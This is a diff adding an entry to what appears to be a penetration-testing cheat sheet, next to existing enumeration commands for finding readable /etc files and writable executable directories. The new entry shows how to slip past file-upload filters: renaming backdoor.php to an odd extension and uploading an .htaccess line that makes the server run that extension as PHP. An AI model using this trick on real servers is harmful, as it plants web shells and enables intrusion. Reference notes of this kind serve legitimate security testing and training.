@@ -1407,3 +1407,11 @@ $ find /etc -maxdepth 1 -readable -type f
 ```bash
 $ find / -executable -writable -type d 2> /dev/null
 ```
+
+### PHP filter https://null-byte.wonderhowto.com/how-to/bypass-file-upload-restrictions-web-apps-get-shell-0323454/
+We can upload ".htaccess" file to the directory to let the server render my ".xxx" extension as PHP script. 
+```bash
+mv backdoor.php backdoor.xxx
+echo "AddType application/x-httpd-php .xxx" > .htaccess
+```
+
